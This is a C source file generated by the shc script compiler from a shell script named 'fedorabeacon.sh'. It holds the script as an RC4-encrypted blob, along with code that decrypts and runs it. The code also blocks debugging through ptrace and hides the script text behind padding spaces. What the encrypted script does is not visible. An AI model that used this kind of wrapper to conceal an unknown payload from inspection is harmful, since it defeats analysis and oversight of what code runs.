#if 0
	shc Version 3.8.9, Generic Script Compiler
	Copyright (c) 1994-2012 Francisco Rosales <frosal@fi.upm.es>

	shc -r -f fedorabeacon.sh 
#endif

static  char data [] = 
#define      msg2_z	19
#define      msg2	((&data[4]))
	"\253\374\216\251\210\343\333\302\032\010\005\223\104\334\334\165"
	"\141\112\305\221\162\050\222\061\177\145\075"
#define      text_z	889
#define      text	((&data[235]))
	"\236\130\332\173\115\313\054\154\307\002\121\327\152\340\045\271"
	"\161\306\265\151\161\262\367\032\343\167\200\041\120\160\110\356"
	"\311\043\152\026\356\226\203\265\231\325\214\003\265\262\274\046"
	"\170\162\220\351\044\210\004\010\377\205\052\117\365\163\076\276"
	"\226\251\325\205\077\131\072\330\056\307\334\343\171\231\012\361"
	"\013\232\333\060\042\340\071\041\145\143\161\133\326\260\032\155"
	"\131\360\362\231\111\055\162\167\364\116\132\156\347\144\140\363"
	"\377\074\044\041\035\135\103\203\300\264\336\227\145\371\004\276"
	"\351\366\130\063\044\312\253\031\030\005\207\000\152\350\364\152"
	"\045\030\213\102\165\316\305\066\203\244\315\350\236\322\247\210"
	"\310\377\273\355\311\146\006\342\154\216\342\327\166\326\101\234"
	"\356\315\336\144\234\244\232\037\110\150\010\346\072\257\156\003"
	"\257\052\360\170\220\366\133\375\204\075\324\373\024\026\227\003"
	"\053\106\217\041\206\027\345\276\002\060\123\173\356\116\324\074"
	"\276\075\364\337\203\047\224\313\375\122\021\124\337\302\303\060"
	"\177\057\354\273\337\363\124\345\210\124\117\152\076\121\323\342"
	"\033\034\241\277\074\155\377\145\300\106\244\140\261\102\226\041"
	"\027\321\301\107\163\041\342\167\134\352\231\221\010\275\170\354"
	"\013\345\255\165\267\141\123\267\141\035\170\144\334\213\170\165"
	"\304\050\205\110\122\336\101\306\233\206\214\237\125\001\175\212"
	"\276\344\044\003\360\202\063\367\317\257\350\342\257\131\351\256"
	"\060\274\252\163\021\150\125\165\066\040\206\150\366\250\317\333"
	"\132\022\053\153\272\246\371\041\077\035\052\046\131\125\010\216"
	"\226\322\230\343\250\301\130\172\166\152\216\354\346\142\152\064"
	"\336\177\255\323\145\007\332\332\102\344\272\064\257\227\346\003"
	"\107\202\230\045\257\275\254\002\316\213\214\336\102\022\137\075"
	"\214\031\114\363\200\306\150\207\017\373\252\236\230\155\246\005"
	"\324\053\343\250\033\050\301\166\166\146\312\203\300\036\033\266"
	"\231\311\147\352\103\057\144\274\253\164\277\240\121\273\074\220"
	"\262\350\324\221\042\366\050\232\045\321\016\325\201\347\230\134"
	"\077\161\022\037\277\127\204\335\031\340\250\005\225\324\367\033"
	"\040\137\052\170\365\150\046\220\011\043\070\125\267\247\044\037"
	"\105\327\256\235\246\017\024\137\156\263\114\167\275\172\271\076"
	"\057\170\022\002\202\256\111\027\147\127\124\204\052\037\361\005"
	"\320\262\300\105\175\151\314\053\177\360\014\160\045\012\372\323"
	"\147\132\126\214\340\065\076\264\273\163\160\117\101\233\105\147"
	"\330\143\321\324\064\226\000\151\340\376\131\355\112\164\112\224"
	"\366\170\215\102\026\256\245\176\103\024\046\344\007\274\271\130"
	"\163\245\271\341\042\040\255\013\335\246\102\261\236\241\356\113"
	"\146\065\022\157\146\113\205\011\341\170\075\047\167\130\067\052"
	"\361\114\230\216\177\010\254\120\313\052\172\212\216\047\065\262"
	"\155\135\237\300\065\271\153\173\371\140\003\352\005\074\134\257"
	"\202\325\116\257\242\160\171\170\020\044\364\123\327\077\037\147"
	"\221\203\247\210\335\171\265\114\257\365\352\204\152\123\154\251"
	"\037\044\311\136\000\361\017\274\206\170\377\024\140\166\057\110"
	"\163\020\012\137\027\160\035\001\212\213\163\335\171\007\105\247"
	"\222\237\201\003\073\340\171\040\361\276\232\153\277\212\161\266"
	"\303\124\170\022\244\071\072\052\117\133\174\266\212\333\115\144"
	"\245\247\020\051\154\166\242\201\141\020\204\201\013\126\035\322"
	"\007\025\127\050\223\354\047\004\237\101\120\257\212\072\173\176"
	"\001\042\241\102\157\100\226\256\253\255\211\016\071\251\143\107"
	"\247\364\373\133\225\353\342\215\373\341\007\343\062\055\001\006"
	"\175\137\160\166\013\161\343\144\303\031\333\100\205\125\266\344"
	"\163\123\177\066\277\062\377\344\263\044\122\233\141\261\025\171"
	"\150\102\354\044\173\361\100\150\347\117\023\377\300\212\360\242"
	"\306\345\125\072\145\213\345\136\302\037\337\074\252\075\213\211"
	"\335\325\272\111\355\372\325\211\216\224\157\116\102\005\067\140"
	"\201\253\027\324\154\210\334\252\351\247\363\367\027\276\324\232"
	"\006\315\062\130\125\150\054\315\120\140\171\250\170\162\144\100"
	"\277\151\315\111\170\155\171\110\324\053\212\165\205\103\011\173"
	"\366\364\311\224\223\053\066\344\033\017\077\176\141\100\256\045"
	"\332\104\366\252\263\137\065\261\065\353\153\070\115\124\102\042"
	"\060\120\003\302\011\346\055\137\265\366\062\046\211\331\342\347"
	"\175\006\051\015\335\234\115\106\274\034\352\066\277\330\355\166"
	"\210\322\123\261\111\251\124\210\335\120\340\340\377\147\367\301"
	"\303\375\341\023\343\251\077\144\253\320\331\304\341\007\223\256"
	"\230\232\167\017\354\203\135\213\054\130\171\236\262\370\176\132"
	"\346\241\350\357\035\001\313\316\176\164\311\101\244\214\246\050"
	"\060\121\373\015\007\013\331\066\265\343\166\147\177\032\002\236"
	"\143\152\247\112\245\127\271\250\006\343\231\176\164\217\331\162"
	"\024\027\107\020\054\135\250\057\100\036\227"
#define      opts_z	1
#define      opts	((&data[1158]))
	"\214"
#define      xecc_z	15
#define      xecc	((&data[1161]))
	"\006\347\230\244\021\235\264\130\361\341\024\010\371\374\152\077"
	"\252"
#define      rlax_z	1
#define      rlax	((&data[1176]))
	"\326"
#define      inlo_z	3
#define      inlo	((&data[1177]))
	"\327\074\265"
#define      tst2_z	19
#define      tst2	((&data[1184]))
	"\174\274\153\221\351\014\212\125\047\073\211\115\202\056\303\075"
	"\363\076\133\160\101\105\254\323\262\241\000"
#define      pswd_z	256
#define      pswd	((&data[1225]))
	"\120\150\307\020\242\141\157\077\147\165\046\021\323\307\145\066"
	"\114\121\262\013\357\244\136\076\144\272\360\141\205\030\227\242"
	"\346\012\070\033\024\342\222\065\057\246\316\157\175\176\340\023"
	"\335\222\036\315\067\175\013\233\070\374\374\275\025\224\137\373"
	"\237\230\027\263\172\251\351\251\120\270\031\315\067\371\340\024"
	"\214\377\341\303\174\355\137\264\352\134\162\377\360\322\373\217"
	"\152\022\103\345\274\054\217\014\345\250\332\034\242\272\060\057"
	"\272\022\363\067\377\122\354\351\256\136\350\237\061\344\057\234"
	"\366\162\202\262\237\021\277\204\272\231\240\135\124\321\214\016"
	"\343\200\106\343\323\062\314\202\221\265\041\303\231\120\137\220"
	"\303\341\102\142\363\002\346\255\234\207\013\360\130\230\377\074"
	"\030\105\037\353\167\354\155\011\241\217\314\073\340\053\313\243"
	"\015\016\005\001\021\354\257\255\164\272\235\315\122\234\011\153"
	"\342\051\126\132\025\304\143\267\124\057\363\064\133\276\327\150"
	"\315\335\151\336\311\031\214\075\323\051\012\045\306\024\220\251"
	"\075\347\003\123\254\146\012\000\226\375\064\361\274\014\132\212"
	"\351\304\150\263\335\364\360\260\036\373\326\345\020\147\216\115"
	"\117\221\030\105\316\324\261\137\250\143\001\250\163\113"
#define      chk2_z	19
#define      chk2	((&data[1496]))
	"\240\324\125\266\130\101\204\135\347\177\045\141\272\147\033\070"
	"\051\242\311\012\273\126\001\104\225"
#define      lsto_z	1
#define      lsto	((&data[1518]))
	"\064"
#define      tst1_z	22
#define      tst1	((&data[1522]))
	"\337\303\320\154\150\227\262\307\105\315\174\310\340\074\061\070"
	"\161\042\141\326\304\305\253\342\377\061\334\025"
#define      msg1_z	42
#define      msg1	((&data[1554]))
	"\137\132\052\140\003\236\253\243\363\304\203\356\343\277\140\052"
	"\176\073\337\267\216\166\324\342\237\304\376\353\367\251\057\360"
	"\347\070\017\331\224\155\056\017\117\214\365\104\043\314\260\335"
	"\056\333\142\137\173\067\265\175\173"
#define      chk1_z	22
#define      chk1	((&data[1609]))
	"\006\141\303\212\101\256\001\230\120\162\376\172\340\023\333\161"
	"\341\224\073\272\215\372\042\276\050\105\124\207"
#define      date_z	1
#define      date	((&data[1632]))
	"\251"
#define      shll_z	10
#define      shll	((&data[1634]))
	"\066\122\316\016\010\303\075\351\007\302\125"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = getenv("_");
	if (me == NULL) { me = argv[0]; }

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
